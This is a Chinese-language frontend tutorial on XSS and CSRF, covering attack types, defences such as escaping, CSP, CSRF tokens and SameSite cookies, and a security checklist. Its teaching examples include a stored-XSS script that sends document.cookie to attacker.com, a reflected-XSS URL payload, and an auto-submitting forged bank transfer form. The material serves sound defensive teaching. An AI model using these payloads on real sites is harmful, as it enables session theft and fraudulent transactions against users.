# XSS 与 CSRF

Web 安全是前端开发不可忽视的环节。XSS 和 CSRF 是最常见的两种攻击方式。

## XSS（跨站脚本攻击）

### 类型

| 类型 | 描述 | 示例 |
|------|------|------|
| 存储型 | 恶意脚本存储在服务器 | 评论、文章中的脚本 |
| 反射型 | 恶意脚本在 URL 中 | 钓鱼链接 |
| DOM 型 | 前端 JavaScript 导致 | innerHTML 插入未过滤内容 |

### 攻击示例

```javascript
// 存储型 XSS
// 攻击者在评论区提交：
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 反射型 XSS
// URL: https://site.com/search?q=<script>alert(1)</script>
const query = new URLSearchParams(location.search).get('q');
document.write(query);  // 危险！
```

### 防御措施

```javascript
// 1. 输入过滤和转义
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// 2. 使用框架的安全机制
// Vue/React 自动转义插值表达式
const userInput = '<script>alert(1)</script>';
// Vue: {{ userInput }} 会被转义
// React: {userInput} 会被转义

// 3. CSP（内容安全策略）
// 响应头：Content-Security-Policy: script-src 'self'
```

## CSRF（跨站请求伪造）

### 攻击原理

```
1. 用户登录银行网站，获得 Cookie
2. 用户访问恶意网站
3. 恶意网站自动发送请求到银行网站
4. 浏览器自动携带 Cookie，请求成功执行
```

```html
<!-- 恶意网站的表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 防御措施

```javascript
// 1. CSRF Token
// 服务器生成 Token，嵌入表单和 Cookie
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/action', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});

// 2. SameSite Cookie
// Set-Cookie: session=xxx; SameSite=Strict
// Strict: 完全禁止第三方 Cookie
// Lax: 允许部分 GET 请求

// 3. 验证 Origin/Referer
```

## 安全检查清单

- [ ] 所有用户输入都经过转义
- [ ] 使用 HTTPS
- [ ] 设置 CSP 响应头
- [ ] Cookie 设置 HttpOnly、Secure、SameSite
- [ ] 敏感操作需要二次验证
- [ ] 定期进行安全审计

::: tip 安全原则
永远不要信任用户输入，始终做输入验证和输出编码。
:::
